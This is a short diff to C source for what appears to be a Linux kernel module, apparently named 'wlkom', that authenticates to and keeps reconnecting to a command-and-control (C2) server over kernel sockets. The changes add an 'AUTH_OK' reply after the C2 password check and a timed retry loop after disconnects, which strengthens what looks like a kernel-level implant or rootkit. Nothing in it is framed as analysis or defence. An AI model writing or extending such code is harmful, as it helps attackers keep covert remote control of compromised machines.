@@ -164,6 +164,9 @@ static int authenticate_c2(void)
     if (strcmp(received_hash, password_hash) != 0)
         return -EACCES;
 
+    if (send_reply("AUTH_OK\n") < 0)
+        return -EIO;
+
     return 0;
 }
 
@@ -240,7 +243,8 @@ disconnect:
         kernel_sock_shutdown(conn_sock, SHUT_RDWR);
         sock_release(conn_sock);
         conn_sock = NULL;
-        pr_info("wlkom: disconnected from C2, retrying\n");
+        pr_info("wlkom: disconnected from C2, retry in %ds\n", RETRY_DELAY);
+        schedule_timeout_interruptible(HZ * RETRY_DELAY);
     }
 
     return 0;
